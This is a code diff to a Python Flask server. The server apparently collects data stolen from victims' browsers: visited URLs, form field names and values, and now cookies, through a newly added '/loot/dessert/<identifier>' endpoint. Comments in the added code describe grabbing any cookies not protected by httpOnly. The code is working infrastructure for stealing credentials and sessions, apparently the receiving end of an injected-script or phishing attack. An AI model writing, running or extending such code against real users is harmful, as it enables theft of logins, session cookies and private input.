@@ -162,7 +162,6 @@ def recordUrl(identifier):
     print("New URL recorded from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json
-    print("*** Content is: " + str(content))
     url = content['url']
     print("Got URL: " + url)
     logEvent(identifier, "URL Visited: " + url)
@@ -181,9 +180,27 @@ def recordInput(identifier):
     inputName = content['inputName']
     inputValue = content['inputValue']
     print("Got input: " + inputName + ", value: " + inputValue)
-    logEvent(identifier, "Input: " + inputName + ", value: " + inputValue)
+    logEvent(identifier, "User input field: " + inputName + ", value: " + inputValue)
 
     return "ok", 200
+
+
+
+# Record whatever cookies we can get our hands on
+# Note that any httpOnly flagged cookies we won't get
+# which would probably include any session cookies. Probably. 
+@app.route('/loot/dessert/<identifier>', methods=['POST'])
+def recordCookie(identifier):
+    print("New cookie recorded from: " + identifier)
+    lootDir = findLootDirectory(identifier)
+    content = request.json
+    # print("**** New cookie report: " + content)
+    cookieName = content['cookieName']
+    cookieValue = content['cookieValue']
+    logEvent(identifier, "Cookie Name: " + cookieName + ", value: " + cookieValue)
+
+    return "ok", 200
+
 
 #**************************************************************************
 
